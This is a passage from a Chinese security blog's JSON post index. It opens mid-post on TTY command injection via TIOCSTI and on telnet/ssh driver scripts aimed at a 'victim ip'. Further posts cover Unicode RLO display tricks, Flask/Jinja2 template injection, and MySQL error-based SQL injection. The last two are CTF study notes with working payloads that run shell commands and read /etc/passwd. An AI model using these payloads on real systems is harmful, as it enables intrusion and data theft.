12345678910111213141516171819fdopen的第一个参数为文件描述符。但是诡异的是：动调发现，运行到这里，打开的文件文件描述符为0。0正是标准输入流。打开文件成功即可继续运行。打开文件失败则报错退出。明明是在已经输入命令之后，难以理解为什么又会打开标准输入流。手动测试了fdopen这个函数。它确实能打开标准输入流，甚至向标准输入流中输出。然而一但进行重定向，这个函数就返回null。在钟sir的指导下，了解到了也存在0不是标准输入流的可能。程序是可以将0重定向到其他流的。继续逆向分析，却收效甚微......就算找到了错误的地方，也仍然不一定能找到解决方法。#### 4.termios模块伪造终端输入这是一个突发奇想，既然无法重定向输入，能否选择其他方式输入？一番搜索之下，找到了python的termios模块，可以伪造终端输入。在 Linux 中可以通过一组函数调用（通用终端接口，简称GTI）来控制终端。termios是在 POSIX 规范中定义的标准接口。python中的termios模块正是通过这个接口，从底层实现伪造终端输入。因此思路很简单：只需打开一个终端，运行nopen。再打开另一个终端，通过伪造输入向nopen所在终端输入命令，实现nopen重复的运行。脚本如下： #!/usr/bin/python import sys,os,fcntl,termiosfrom random import choiceif len(sys.argv) != 3: sys.stderr.write(“usage: ttyexec.py tty command_number\\n”) sys.exit(1)fd = os.open(“/dev/“ + sys.argv[1], os.O_RDWR)command_number = int(sys.argv[2]) with open(‘commands.txt’, ‘r’) as f: command_list = [line.strip() for line in f.readlines()] for i in range(command_number): cmd = choice(command_list) for j in range(len(cmd)): fcntl.ioctl(fd, termios.TIOCSTI, cmd[j]) fcntl.ioctl(fd, termios.TIOCSTI, &#39;\\n&#39;) os.close(fd) 1234567在我自己的环境终于测试成功！！！，然而......AI的人在docker运行出错了。---AI方向使用docker运行脚本，docker运行的过程中报错如下： IOError:[Errno 1]Operation not permitted 1234567891011明显是一个权限问题。去百度了这个问题，确实是权限不足。百度到的问题是root权限尝试修改某些特殊文件出现这个报错，原因在于文件属性。查看文件属性可以发现文件有属性i，可以确保文件不被修改。执行比chmod更底层的命令chattr，可以修改文件属性，随后便可以修改文件。然而，这对解决问题没有太大帮助。因为无法用chattr命令去修改/der/pts/tty的属性。#### 5.最终方法经历了许久，最后突然想到可以绕过这个问题。在伪造终端输入的时候，向其他终端伪造输入是需要管理员权限的，但是在运行该脚本的自身终端输入则不需要管理员权限。可以控制脚本sleep几秒，并后台运行。再打开nopen，就可以实现重复执行命令。 #!/usr/bin/python import sys,os,fcntl,termiosfrom random import choiceif len(sys.argv) != 3: sys.stderr.write(“usage: ttyexec.py tty command_number\\n”) sys.exit(1)fd = os.open(“/dev/“ + sys.argv[1], os.O_RDWR)command_number = int(sys.argv[2])sleep(10) with open(‘commands.txt’, ‘r’) as f: command_list = [line.strip() for line in f.readlines()] for i in range(command_number): cmd = choice(command_list) for j in range(len(cmd)): fcntl.ioctl(fd, termios.TIOCSTI, cmd[j]) fcntl.ioctl(fd, termios.TIOCSTI, &#39;\\n&#39;) os.close(fd) 123456789使用方法：- commands.txt 执行命令的内容（需要与ttyexec.py在同一目录下）- commands.txt每一行为需要执行的命令- ``` $ python ttyexec.py tty 100 &amp; 在同一终端运行nopen client （3）telnet实现telnet的重定向方法很多，这里采用与dewdrop相同的方法，使用subprocess模块。不同之处仅仅在于需要输入用户名和密码。 123456789101112131415161718192021222324252627282930313233343536import sysimport timeimport subprocessfrom random import choiceif __name__==&quot;__main__&quot;: #check for args, print usage if incorrect if len(sys.argv) != 5: print(&#x27;\\nUsage:\\nruntelnet.py [victim ip] [username] [passwd] [commands number]\\n&#x27;) sys.exit() dip = sys.argv[1] username = sys.argv[2] passwd = sys.argv[3] command_number = int(sys.argv[4]) run_command = &#x27;telnet &#123;&#125; &#x27;.format(dip) p = subprocess.Popen(run_command, stdin=subprocess.PIPE, stdout=None, shell=True) time.sleep(3) p.stdin.write(username) time.sleep(3) p.stdin.write(&quot;\\n&quot;) time.sleep(3) p.stdin.write(passwd) time.sleep(3) p.stdin.write(&quot;\\n&quot;) time.sleep(5) with open(&#x27;commands.txt&#x27;, &#x27;r&#x27;) as f: command_list = [line.strip() for line in f.readlines()] for i in range(command_number): p.stdin.write(choice(command_list) + &quot;\\n&quot;) p.stdin.write(str(i) + &quot;\\n&quot;) p.stdin.flush() time.sleep(0.2) time.sleep(3) p.stdin.write(&quot;exit\\n&quot;) 使用方法： 运行环境python2 需要在同一目录新建一个commands.txt，commands.txt中每一行为所需执行的命令。 运行命令 1$ python runtelnet.py &#123;ip地址&#125; &#123;用户名&#125; &#123;密码&#125; &#123;发包个数&#125; 已解决发包次数过多后断开的问题。（脚本中每执行一条命令后sleep 0.2秒） （4）sshssh会自动检测输入是否被重定向。 1Pseudo-terminal will not be allocated because stdin is not a terminal 可以使用-tt强制分配为伪终端，即使标准输入不是终端。尽管如此，ssh的密码依然无法通过重定向输入，需要手动输入。 12345678910111213141516171819202122232425262728import sysimport timeimport subprocessfrom random import choiceif __name__==&quot;__main__&quot;: #check for args, print usage if incorrect if len(sys.argv) != 3: print(&#x27;\\nUsage:\\nrunssh.py [victim ip] [commands number]\\n&#x27;) sys.exit() dip = sys.argv[1] command_number = int(sys.argv[2]) run_command = &#x27;ssh -tt &#123;&#125; &#x27;.format(dip) p = subprocess.Popen(run_command, stdin=subprocess.PIPE, stdout=None, shell=True) time.sleep(3) p.stdin.write(&quot;\\n&quot;) time.sleep(5) with open(&#x27;commands.txt&#x27;, &#x27;r&#x27;) as f: command_list = [line.strip() for line in f.readlines()] for i in range(command_number): p.stdin.write(choice(command_list) + &quot;\\n&quot;) p.stdin.write(str(i) + &quot;\\n&quot;) p.stdin.flush() time.sleep(0.2) time.sleep(10) p.stdin.write(&quot;exit\\n&quot;) 使用方法： 运行环境 python2 需要在本目录新建一个commands.txt，commands.txt中每行为所需要执行的命令。 运行命令 1$ python runssh.py &#123;目标ip&#125; &#123;执行命令个数&#125; 执行后需要手动输入靶机密码。输入密码后程序自动继续运行。 已解决发包次数过多后断开的问题。（脚本中每执行一条命令后sleep 0.2秒）","categories":[{"name":"Dian","slug":"Dian","permalink":"http://example.com/categories/Dian/"}],"tags":[{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"},{"name":"重定向","slug":"重定向","permalink":"http://example.com/tags/%E9%87%8D%E5%AE%9A%E5%90%91/"}]},{"title":"unicode的小把戏","slug":"unicode的小把戏","date":"2020-08-24T13:19:12.000Z","updated":"2021-06-06T06:29:22.241Z","comments":true,"path":"2020/08/24/unicode的小把戏/","link":"","permalink":"http://example.com/2020/08/24/unicode%E7%9A%84%E5%B0%8F%E6%8A%8A%E6%88%8F/","excerpt":"UnicodeUnicode是计算机科学领域里的一项业界标准，它为每种语言中的每个字符设定了统一并且唯一的二进制编码。 下面来说一说一些unicode的trick","text":"UnicodeUnicode是计算机科学领域里的一项业界标准，它为每种语言中的每个字符设定了统一并且唯一的二进制编码。 下面来说一说一些unicode的trick QQ聊天小尾巴（仅限手机端） 最近见到有些人的昵称后面加了个喵~，一开始还以为只是卖萌，后来才发现奇怪之处。在QQ界面可以看到QQ群消息的最近一条消息以及发出消息的人名，但是这些喵~却诡异地移动到了所发消息之后 看起来诡异，但是一猜就是unicode。 究竟是怎么回事？先看看他的群名 1Void‮～喵‭ 转成unicode 12&amp;#86;&amp;#111;&amp;#105;&amp;#100;&amp;#8238;&amp;#65374;&amp;#21941;&amp;#8237;//V o i d ~ 喵 搜一下这些unicode的含义，是正常字符的就不说了，重点是两个不可见字符。 这两个均为控制字符。其中， RLO(&amp;#8238;)为从右至左优先，强制字符成为从右到左字符串。 LRO(&amp;#8237;)为从左至右优先，强制字符成为从左到右字符串。 这就是小尾巴的奥秘所在。当然，在读取文字编码时，读到&amp;#8238;时，强制从右到左，后面的文字会在本行从右向左显示。当读到&amp;#8237;时，又回归正常的从左向右，不会后面影响正常的文字。 当然，这种小尾巴的缺点在于，别人@你时，他所发的文字如果与&amp;#8238;在同一行，文字的内容可能会被翻转。但是仅对这一行有效。","categories":[{"name":"misc","slug":"misc","permalink":"http://example.com/categories/misc/"}],"tags":[{"name":"unicode","slug":"unicode","permalink":"http://example.com/tags/unicode/"}]},{"title":"flask模板注入","slug":"flask模板注入（一）","date":"2020-08-16T10:07:48.000Z","updated":"2021-06-06T06:36:07.247Z","comments":true,"path":"2020/08/16/flask模板注入（一）/","link":"","permalink":"http://example.com/2020/08/16/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%80%EF%BC%89/","excerpt":"","text":"Flask模板注入（一）Flask中使用了Jinja2作为模板渲染引擎，Jinja2会将{{}}中包裹的内容当作变量解析替换。当服务器接受了用户的输入并将其作为模板的一部分，在渲染的过程中就可能渲染了用户插入的恶意内容，导致敏感信息泄露甚至代码执行。 1、实现模板注入1.1 基础知识（1）_class_ 获取当前实例的类对象1234&gt;&gt;&gt; &#x27;&#x27;.__class__&lt;type &#x27;str&#x27;&gt; //空字符串是一个实例，对应的类是&lt;type &#x27;str&#x27;&gt; &gt;&gt;&gt; [].__class__&lt;type &#x27;list&#x27;&gt; //空列表串是一个实例，对应的类是&lt;type &#x27;list&#x27;&gt; （2）_base_ 获取当前类的一个继承类123456&gt;&gt;&gt; [].__class__.__base__&lt;type &#x27;object&#x27;&gt;&gt;&gt;&gt; &#x27;&#x27;.__class__.__base__&lt;type &#x27;basestring&#x27;&gt;&gt;&gt;&gt; &#x27;&#x27;.__class__.__base__.__base__&lt;type &#x27;object&#x27;&gt; //在python2.7中大部分类都继承了object类 （3）_mro_ 获取当前类的所有继承类1234&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__(&lt;type &#x27;str&#x27;&gt;, &lt;type &#x27;basestring&#x27;&gt;, &lt;type &#x27;object&#x27;&gt;)&gt;&gt;&gt; [].__class__.__mro__(&lt;type &#x27;list&#x27;&gt;, &lt;type &#x27;object&#x27;&gt;) （4）_subclasses_() 获取当前类的所有继承类列表1234&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[40]&lt;type &#x27;file&#x27;&gt; //object的第40个子类//python2和python3的不同版本在object的子类中有较大不同 （5）_init_ 用于将对象实例化（6）_dict_ 用于列出当前属性/函数的字典12345&gt;&gt;&gt; object.__subclasses__()[60].__init__.func_globals[&#x27;linecache&#x27;].os&lt;module &#x27;os&#x27; from &#x27;D:\\python2.7\\lib\\os.pyc&#x27;&gt;&gt;&gt;&gt; object.__subclasses__()[60].__init__.func_globals[&#x27;linecache&#x27;].__dict__[&#x27;os&#x27;]&lt;module &#x27;os&#x27; from &#x27;D:\\python2.7\\lib\\os.pyc&#x27;&gt;\\\\这里感觉没有什么区别 （7） _getitem_1234567&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__(&lt;type &#x27;str&#x27;&gt;, &lt;type &#x27;basestring&#x27;&gt;, &lt;type &#x27;object&#x27;&gt;)&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__.__getitem__(1)&lt;type &#x27;basestring&#x27;&gt;&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__.__getitem__(2)&lt;type &#x27;object&#x27;&gt; （8）func_globals 返回一个包含函数全局变量的字典引用（9）_globals_ 对保存函数全局变量(定义函数的模块的全局名称空间)的字典的引用。1.2 实现恶意命令注入（1）文件读取在object的所有子类中可以找到file类 1234&gt;&gt;&gt; object.__subclasses__()[40]&lt;type &#x27;file&#x27;&gt;&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[40]&lt;type &#x27;file&#x27;&gt; //object的第40个子类一般为file 故可以进行文件读取 123&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[40](&#x27;/etc/passwd&#x27;)&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/flag.txt&#x27;).read() （2）命令执行-方法1包含os模块的两个类： 123&gt;&gt;&gt; object.__subclasses__()[72]&lt;class &#x27;site._Printer&#x27;&gt; //这里环境该类位于object的第72个子类。但环境不同位置可能不同&lt;class &#x27;site.Quitter&#x27;&gt; //这里环境该类位于object的第77个子类。但环境不同位置可能不同 实现命令执行的payload 12345&gt;&gt;&gt; object.__subclasses__()[72].__init__.__globals__[&#x27;os&#x27;].system(&#x27;ls&#x27;)&gt;&gt;&gt; object.__subclasses__()[77].__init__.__globals__[&#x27;os&#x27;].system(&#x27;ls&#x27;)//在注入时，直接使用system函数可能导致无回显，故可以使用popen函数&gt;&gt;&gt; object.__subclasses__()[72].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&gt;&gt;&gt; object.__subclasses__()[77].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() （3）命令执行-方法2利用warnings.catch_warnings模块 12&gt;&gt;&gt; object.__subclasses__()[60]&lt;class &#x27;warnings.catch_warnings&#x27;&gt; //这里环境该类位于object的第60个子类。但环境不同位置可能不同 实现命令执行 1&gt;&gt;&gt; object.__subclasses__()[60].__init__.func_globals[&#x27;linecache&#x27;].os.popen(&#x27;whoami&#x27;).read() 再补充一些payload 1234567&gt;&gt;&gt; object.__subclasses__()[60].__init__.func_globals[&#x27;linecache&#x27;].__dict__[&#x27;o&#x27;+&#x27;s&#x27;].__dict__[&#x27;po&#x27;+&#x27;pen&#x27;](&#x27;whoami&#x27;).read()&#x27;laptop-91trpmfu\\\\admin\\n&#x27;\\\\利用__dict__可以绕过某些黑名单&gt;&gt;&gt; object.__subclasses__()[60].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;)&#x27;laptop-91trpmfu\\\\admin\\n&#x27;\\\\使用eval （4）遍历找到catch_warnings的payload1234//执行命令&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;//读文件&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;app.py&#x27;,&#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 2、附录2.1 一些任意代码执行及读取文件函数（1）os执行系统命令12import osos.system(&#x27;ipconfig&#x27;) （2）exec 任意代码执行1exec(&#x27;__import__(&quot;os&quot;).system(&quot;ipconfig&quot;)&#x27;) （3）eval 任意代码执行1eval(&#x27;__import__(&quot;os&quot;).system(&quot;ipconfig&quot;)&#x27;) （4）timeit 本是检测性能的，也可以任意代码执行12import timeittimeit.timeit(&quot;__import__(&#x27;os&#x27;).system(&#x27;ipconfig&#x27;)&quot;,number=1) （5）platform12import platformplatform.popen(&#x27;ipconfig&#x27;).read() （6）subprocess12import subprocesssubprocess.Popen(&#x27;ipconfig&#x27;, shell=True, stdout=subprocess.PIPE,stderr=subprocess.STDOUT).stdout.read() （7）file1file(&#x27;/etc/passwd&#x27;).read() （8）open1open(&#x27;/etc/passwd&#x27;).read() （9）codecs12import codecscodecs.open(&#x27;/etc/passwd&#x27;).read() 3、然而……这只是基础后续会相继补上： flask模板注入（2） 参考链接python 模板注入 Flask模板注入 FLASK模板注入（SSTI） Flask/Jinja2 SSTI &amp;&amp; python 沙箱逃逸 还有一个基础而重要的 python _globals, _file","categories":[{"name":"CTF-web","slug":"CTF-web","permalink":"http://example.com/categories/CTF-web/"}],"tags":[{"name":"CTF-web","slug":"CTF-web","permalink":"http://example.com/tags/CTF-web/"},{"name":"SSTI","slug":"SSTI","permalink":"http://example.com/tags/SSTI/"},{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"}]},{"title":"报错注入","slug":"报错注入","date":"2020-07-10T14:04:51.000Z","updated":"2021-06-06T06:31:52.162Z","comments":true,"path":"2020/07/10/报错注入/","link":"","permalink":"http://example.com/2020/07/10/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/","excerpt":"","text":"报错注入之前都是做题中积累经验，感觉自己的基础薄弱。大部分时候都是看别人的WP才能做题。最近在看一本《CTF训练营》，补一补基础，做笔记。 报错注入的条件 可回显 回显有报错信息 过滤不严格（希望WAF不行） 绕过是个麻烦事儿，这里暂且假设没有任何过滤。 报错注入使用的函数updatexml()1234UPDATEXML (XML_document, XPath_string, new_value); 第一个参数：XML_document，String格式，为XML文档对象的名称第二个参数：XPath_string (Xpath格式的字符串) 第三个参数：new_value，String格式，替换查找到的符合条件的数据 updatexml()的第二个参数为Xpath格式的字符串，当其不属于Xpath语法时就会报错，报错内容显示出该参数不符合Xpath语法。 12mysql&gt; SELECT updatexml(1, concat(Ox7e,(SELECT version()),0x7e),1);ERROR 1105 (HY00O): XPATH syntax error: &#x27; -5.6.26~ &#x27; #成功爆出数据库版本 于是，通过改变updatexml()的第二个参数，可以执行SQL语句查数据库、查表、等等。 extractvalue()123EXTRACTVALUE (XML_document, XPath_string); 第一个参数：XML_document是String格式，为XML文档对象的名称第二个参数：XPath_string (Xpath格式的字符串) extractvalue()从XML中返回包含查询值的字符串。通过extractvalue()实现报错注入的原理与updatexml()十分类似。都是通过参数不符合Xpath的语法，实现报错注入。 12mysql&gt; SELECT 1,2 and extractvalue(1,concat(Ox7e,(SELECT version()),0x7e));ERROR 1105 (HY00O): XPATH syntax error: &#x27; -5.6.26~ &#x27; #成功爆出数据库版本 floor()floor()函数只有一个参数。 floor函数的作用是返回小于等于该值的最大整数，即向下取整，只保留整数部分。 123?id=1&#x27;+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_ schema.tables limit 0,1),floor(rand(0)*2))x from information_ schema.tables group by x)a)%23#来源于《CTF训练营》 可爆出数据库版本。 exp()exp()函数只有一个参数。 此函数返回e(自然对数的底)指数X的幂值。但是当传递的参数大于709时，就会发生溢出错误。 正确执行函数返回0，对0按位取反可以得到很大的数“18446744073709551615”，故可以构造注入语句。 1id=1&#x27; an exp(~(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x)); 参考链接SQL注入 | exp()函数报错 《CTF训练营》","categories":[{"name":"CTF-web","slug":"CTF-web","permalink":"http://example.com/categories/CTF-web/"}],"tags":[{"name":"CTF-web","slug":"CTF-web","permalink":"http://example.com/tags/CTF-web/"},{"name":"SQL注入","slug":"SQL注入","permalink":"http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"}]}],"categories":[{"name":"Dian","slug":"Dian","permalink":"http://example.com/categories/Dian/"},{"name":"misc","slug":"misc","permalink":"http://example.com/categories/misc/"},{"name":"CTF-web","slug":"CTF-web","permalink":"http://example.com/categories/CTF-web/"}],"tags":[{"name":"嗅探","slug":"嗅探","permalink":"http://example.com/tags/%E5%97%85%E6%8E%A2/"},{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"},{"name":"C","slug":"C","permalink":"http://example.com/tags/C/"},{"name":"php","slug":"php","permalink":"http://example.com/tags/php/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"},{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"},{"name":"重定向","slug":"重定向","permalink":"http://example.com/tags/%E9%87%8D%E5%AE%9A%E5%90%91/"},{"name":"unicode","slug":"unicode","permalink":"http://example.com/tags/unicode/"},{"name":"CTF-web","slug":"CTF-web","permalink":"http://example.com/tags/CTF-web/"},{"name":"SSTI","slug":"SSTI","permalink":"http://example.com/tags/SSTI/"},{"name":"SQL注入","slug":"SQL注入","permalink":"http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"}]}